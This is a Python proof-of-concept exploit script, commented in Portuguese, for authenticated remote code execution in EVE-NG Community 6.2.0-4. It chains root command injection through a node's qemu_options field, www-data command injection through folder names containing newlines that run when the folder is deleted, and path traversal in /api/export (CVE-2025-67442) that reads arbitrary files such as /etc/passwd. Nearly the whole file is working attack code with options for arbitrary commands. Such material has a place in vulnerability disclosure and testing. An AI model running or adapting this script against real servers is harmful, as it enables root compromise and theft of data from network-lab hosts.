#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# =============================================================================
# eveng_rce.py - PoC de RCE autenticada no EVE-NG Community 6.2.0-4
#
#   [1] RCE como ROOT via qemu_options  (CWE-78)
#       __node.php retorna o comando de start com addslashes(escapeshellcmd())
#       mas ordem invertida desfaz a protecao. cli.php executa via exec() e o
#       start roda por 'sudo unl_wrapper', entao o comando injetado roda como root.
#
#   [2] RCE como www-data via delete de pasta  (CWE-78)
#       apiDeleteFolder monta 'find <path> ... -exec ...' com o path sem aspas.
#       checkFolder aceita '\s' (inclui '\n') e apiAddFolder nao valida 'name':
#       uma pasta cujo NOME tem \n<comando>\n injeta um comando ao ser deletada.
#
#   [3] Path traversal em /api/export - CVE-2025-67442 (CWE-22)
#       apiExportLabs (api_labs.php) concatena BASE_LAB + path + nome sem
#       normalizar '..'; o comando 'zip' resolve o traversal e le arquivos fora
#       do diretorio de labs. Usado p/ ler de volta a prova gravada pelos RCEs.
#       CVE-2025-67442: o registro cita so o Professional 6.4.0-13, mas a
#       Community 6.2.0-4 é afetada.
#
import argparse, json, os, sys, time, subprocess, tempfile, secrets, urllib.parse, re

UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36")

# O comando injetado via delete de pasta so pode usar letras, numeros, espaco,
# '_', '-' e '/' (checkFolder aceita so [/A-Za-z0-9_\s-]).
FORBIDDEN = set('.;$>|&(){}"\'`')

RO_QEMU_DEFAULT = ("-machine type=pc,accel=kvm -serial mon:stdio -nographic "
                   "-no-user-config -nodefaults -display none -vga std -rtc base=utc")

class Ctx:
    def __init__(s, base, jar, cookie, proxy, insecure, maxtime=25):
        s.base = base.rstrip("/"); s.jar = jar; s.cookie = cookie; s.proxy = proxy
        s.insecure = insecure; s.maxtime = maxtime

def headers(ctx, json_ct=True):
    h = [("X-Requested-With", "XMLHttpRequest"),
         ("Accept", "application/json, text/javascript, */*; q=0.01"),
         ("Origin", ctx.base), ("Referer", ctx.base + "/"), ("User-Agent", UA)]
    if json_ct: h.append(("Content-Type", "application/json;charset=UTF-8"))
    if ctx.cookie: h.append(("Cookie", ctx.cookie))
    return h

def curl(ctx, method, path, body=None, json_ct=True):
    url = ctx.base + path
    bf = tempfile.NamedTemporaryFile(delete=False); bf.close()
    cmd = ["curl", "-sS", "--path-as-is", "-m", str(ctx.maxtime),
           "-X", method, url, "-o", bf.name, "-w", "%{http_code} %{time_total}"]
    if ctx.insecure: cmd.append("-k")
    if ctx.proxy: cmd += ["-x", ctx.proxy]
    if not ctx.cookie: cmd += ["-c", ctx.jar, "-b", ctx.jar]
    for k, v in headers(ctx, json_ct): cmd += ["-H", "%s: %s" % (k, v)]
    if body is not None: cmd += ["--data-raw", body]
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=ctx.maxtime + 10)
    except FileNotFoundError:
        print("[!] curl nao encontrado."); sys.exit(3)
    except subprocess.TimeoutExpired:
        print("    [!] SEM RESPOSTA em %ss" % ctx.maxtime)
        os.unlink(bf.name); return 0, float(ctx.maxtime), b""
    if p.returncode == 28:
        print("    [!] curl timeout em %ss." % ctx.maxtime)
        data = open(bf.name, "rb").read(); os.unlink(bf.name); return 0, float(ctx.maxtime), data
    code, tt = 0, 0.0
    out = (p.stdout or "").strip().split()
    if len(out) >= 2:
        try: code = int(out[-2]); tt = float(out[-1])
        except ValueError: pass
    data = open(bf.name, "rb").read(); os.unlink(bf.name)
    return code, tt, data

def login(ctx, u, pw):
    code, _, raw = curl(ctx, "POST", "/api/auth/login",
                        json.dumps({"username": u, "password": pw, "html5": "-1"}))
    ok = ('"status":"success"' in raw.decode(errors="replace")) or code == 200
    print("[*] Login HTTP %s -> %s" % (code, "OK" if ok else "FALHOU")); return ok

# ============================ VETOR 2: delete de pasta (www-data) =============
def add_folder(ctx, parent, name):
    code, _, raw = curl(ctx, "POST", "/api/folders", json.dumps({"path": parent, "name": name}))
    return code, raw.decode(errors="replace")[:120]

def delete_path(ctx, segments):
    enc = "/".join(urllib.parse.quote(s, safe="") for s in segments)
    code, tt, _ = curl(ctx, "DELETE", "/api/folders/" + enc, json_ct=False)
    return code, tt

def run_exec(ctx, cmd):
    # full = <prefix>\n<cmd>\n<suffix> ; split('/') => cada parte vira um diretorio.
    bad = set(cmd) & FORBIDDEN
    if bad:
        print("[!] CMD contem caracteres bloqueados pelo filtro de pasta: %r" % sorted(bad))
        print("    Permitido: letras, numeros, _ - / e espaco.")
        return None
    tok = secrets.token_hex(3)
    prefix = "pocrce" + tok; suffix = "z" + tok
    segments = (prefix + "\n" + cmd + "\n" + suffix).split("/")
    print("[*] Comando alvo : %r" % cmd)
    parent = "/"
    for seg in segments:
        code, msg = add_folder(ctx, parent, seg)
        if code != 200:
            print("    [!] Falha criando segmento %r (HTTP %s): %s" % (seg, code, msg))
            return None
        parent = ("" if parent == "/" else parent) + "/" + seg
    print("[*] Cadeia de %d pastas criada. Disparando DELETE (injecao)..." % len(segments))
    dcode, tt = delete_path(ctx, segments)
    print("    delete=HTTP%s  tempo=%.2fs" % (dcode, tt))
    return {"segments": segments, "time": tt, "delete": dcode}

def run_wwwdata(ctx, cmd, lab):
    print("=" * 70)
    print(" VETOR 2 - RCE como www-data via delete de pasta")
    print("=" * 70)
    # logsave grava a saida do comando em arquivo legivel pelo www-data.
    out = "/tmp/o" + secrets.token_hex(3)
    r = run_exec(ctx, "logsave %s %s" % (out, cmd))
    if not r: return
    print("[*] Lendo saida em %s via /api/export ..." % out)
    time.sleep(1)
    data = read_file(ctx, lab, out)
    if data:
        print("\n===== SAIDA DO COMANDO =====")
        sys.stdout.buffer.write(data[:4000]); print("\n" + "=" * 52)
    else:
        print("    [-] Nao consegui ler %s (o binario pode nao existir no host)." % out)

# ============================ CVE-2025-67442: traversal /api/export ==============
def read_file(ctx, lab, target, hops=6):
    trav = "/" + ("../" * hops) + target.lstrip("/")
    body = json.dumps({"path": "/", "0": lab, "1": trav})
    # /api/export so processa o corpo como x-www-form-urlencoded (json_ct=False);
    # com Content-Type application/json o readback volta vazio.
    code, _, raw = curl(ctx, "POST", "/api/export", body, json_ct=False)
    if raw[:2] == b"PK":
        return _extract(raw, target)
    txt = raw.decode(errors="replace")
    m = re.search(r'(/[^"\'\\]+\.zip)', txt.replace("\\/", "/"))
    if not m:
        return None
    code, _, raw = curl(ctx, "GET", m.group(1).replace("\\/", "/"))
    return _extract(raw, target) if raw[:2] == b"PK" else None

def _extract(zbytes, target):
    import zipfile, io
    try: zf = zipfile.ZipFile(io.BytesIO(zbytes))
    except Exception: return None
    base = target.strip("/").split("/")[-1]
    for info in zf.infolist():
        if info.filename.rstrip("/").split("/")[-1] == base or base in info.filename:
            return zf.read(info.filename)
    return None

def run_read_file(ctx, lab, target):
    print("=" * 70)
    print(" CONFIRMACAO (path traversal /api/export): leitura arbitraria")
    print("=" * 70)
    print("[*] Alvo: %s" % target)
    data = read_file(ctx, lab, target)
    if data:
        print("\n===== CONTEUDO DE %s =====" % target)
        sys.stdout.buffer.write(data[:4000]); print("\n" + "=" * 40)
    else:
        print("    [-] Nao consegui ler %s (ajuste --lab ou o alvo)." % target)

# ============================ VETOR 1: qemu_options + start (root) ============
def _lab_url(lab):
    return "/api/labs/" + urllib.parse.quote(lab.lstrip("/"), safe="/+")

def node_get(ctx, lab, nid):
    code, _, raw = curl(ctx, "GET", "%s/nodes/%d" % (_lab_url(lab), nid), json_ct=False)
    try: j = json.loads(raw.decode(errors="replace"))
    except Exception: return code, None
    return code, (j.get("data") if isinstance(j, dict) else None)

def node_edit_qemu(ctx, lab, nid, qopts, ro=None):
    ro_val = ro if ro else RO_QEMU_DEFAULT
    if ro_val == qopts: ro_val = ro_val + " "
    body = json.dumps({"id": nid, "qemu_options": qopts, "ro_qemu_options": ro_val})
    code, _, raw = curl(ctx, "PUT", "%s/nodes/%d" % (_lab_url(lab), nid), body, json_ct=False)
    return code, raw.decode(errors="replace")[:200]

def node_action(ctx, lab, nid, action):  # action: start | stop
    code, _, raw = curl(ctx, "GET", "%s/nodes/%d/%s" % (_lab_url(lab), nid, action), json_ct=False)
    return code, raw.decode(errors="replace")[:200]

def _qemu_payload(cmd):
    return "& true ; %s ; true" % cmd

def run_qemu(ctx, lab, nid, cmd, wait, restore, readback):
    print("=" * 70)
    print(" VETOR 1 - RCE como ROOT via qemu_options + start de no")
    print("=" * 70)
    payload = _qemu_payload(cmd)
    print("[*] Lab=%s  node=%d" % (lab, nid))
    print("[*] Payload qemu_options: %r" % payload)

    gc, data = node_get(ctx, lab, nid)
    orig = None; ntype = None
    if isinstance(data, dict):
        orig = data.get("qemu_options"); ntype = data.get("type")
        print("    [i] node.type=%s  qemu_options atual=%r" % (ntype, orig))
    if ntype and ntype != "qemu":
        print("    [!] Aviso: o no %d nao e' 'qemu' (type=%s). O vetor exige um no QEMU." % (nid, ntype))

    print("[*] Parando o no (para re-ler o qemu_options no start)...")
    node_action(ctx, lab, nid, "stop"); time.sleep(1)

    print("[*] Editando o qemu_options do no...")
    ec, em = node_edit_qemu(ctx, lab, nid, payload)
    print("    edit qemu_options -> HTTP %s: %s" % (ec, em))

    print("[*] Dando START no no (dispara o exec() como root)...")
    sc, sm = node_action(ctx, lab, nid, "start")
    print("    start -> HTTP %s: %s" % (sc, sm))

    print("[*] Aguardando %ds o wrapper/qemu rodar o comando..." % wait)
    time.sleep(wait)

    if readback:
        print("[*] Lendo %s de volta via /api/export..." % readback)
        got = read_file(ctx, lab, readback)
        if got and got.strip():
            print("\n===== CONTEUDO DE %s =====" % readback)
            sys.stdout.buffer.write(got[:4000]); print("\n" + "=" * 52)
            print("[+] ROOT RCE CONFIRMADO: arquivo criado pelo start.")
        else:
            print("    [-] Nao consegui ler %s. Confirme no QEMU + iniciado; aumente --qemu-wait." % readback)
    else:
        print("[i] Comando disparado (sem readback).")

    if restore:
        back = orig if orig is not None else ""
        print("\n[*] Restaurando estado: stop + qemu_options original...")
        node_action(ctx, lab, nid, "stop"); time.sleep(1)
        rc, rm = node_edit_qemu(ctx, lab, nid, back)
        print("    restore -> HTTP %s" % rc)
    else:
        print("\n[i] --no-restore: o qemu_options malicioso permanece e o no segue iniciado.")

def main():
    ap = argparse.ArgumentParser(
        description="EVE-NG Community 6.2.0-4 - PoC: RCE root (qemu_options) "
                    "e RCE www-data (delete de pasta), com leitura via /api/export (CVE-2025-67442)")
    ap.add_argument("--url", required=True, help="Base, ex.: http://127.0.0.1:8081")
    ap.add_argument("--user", default="admin"); ap.add_argument("--password", default="eve")
    ap.add_argument("--cookie", help="Usa este Cookie em vez de logar (ex.: 'unetlab_session=...')")
    ap.add_argument("--lab", default="/teste.unl", help="Lab real p/ ancorar o read-back / traversal")

    # VETOR 1 - RCE root via qemu_options
    ap.add_argument("--qemu-cmd", dest="qemucmd", metavar="CMD",
                    help='Vetor 1: comando arbitrario como ROOT. Se o comando gravar em um arquivo '
                         'legivel pelo www-data (ex.: "... > /tmp/owned.txt"), esse arquivo e lido de '
                         'volta via /api/export. Ex.: --qemu-cmd "cat /etc/hostname > /tmp/owned.txt"')
    ap.add_argument("--node", type=int, default=1, help="ID do no QEMU alvo (default 1)")
    ap.add_argument("--qemu-wait", dest="qemuwait", type=int, default=8,
                    help="Segundos de espera apos o start (default 8)")
    ap.add_argument("--no-restore", dest="norestore", action="store_true",
                    help="Nao restaurar o qemu_options original nem parar o no")

    # VETOR 2 - RCE www-data via delete de pasta
    ap.add_argument("--exec", dest="execcmd", metavar="CMD",
                    help='Vetor 2: comando arbitrario como www-data, com leitura da saida. Ex.: --exec "id"')

    # CVE-2025-67442
    ap.add_argument("--read-file", dest="readfile", metavar="TARGET",
                    help="Le um arquivo arbitrario via /api/export. Ex.: --read-file /etc/passwd")

    ap.add_argument("--proxy", help="Proxy p/ todas as requisicoes, ex.: http://127.0.0.1:8080 (Burp)")
    ap.add_argument("--insecure", action="store_true", help="Ignora verificacao TLS / cert do proxy")
    ap.add_argument("--timeout", type=int, default=25, help="Timeout por requisicao em s (default 25)")
    a = ap.parse_args()

    jar = os.path.join(tempfile.gettempdir(), "eveng_rce_%d.cookies" % os.getpid())
    ctx = Ctx(a.url, jar, a.cookie, a.proxy, a.insecure, a.timeout)
    if a.cookie: print("[*] Usando cookie fornecido.")
    elif not login(ctx, a.user, a.password): print("[!] Login falhou."); sys.exit(1)

    if a.qemucmd:
        # le de volta o alvo do ultimo redirecionamento (> arquivo) do comando;
        # sem redirecionamento, dispara sem readback.
        m = re.findall(r'>>?\s*([^\s;|&>]+)', a.qemucmd)
        readback = m[-1] if m else None
        run_qemu(ctx, a.lab, a.node, a.qemucmd, a.qemuwait, not a.norestore, readback)
    elif a.readfile:
        run_read_file(ctx, a.lab, a.readfile)
    elif a.execcmd:
        run_wwwdata(ctx, a.execcmd, a.lab)
    else:
        ap.print_help()

    if not a.cookie and os.path.exists(jar):
        try: os.unlink(jar)
        except OSError: pass

if __name__ == "__main__":
    main()
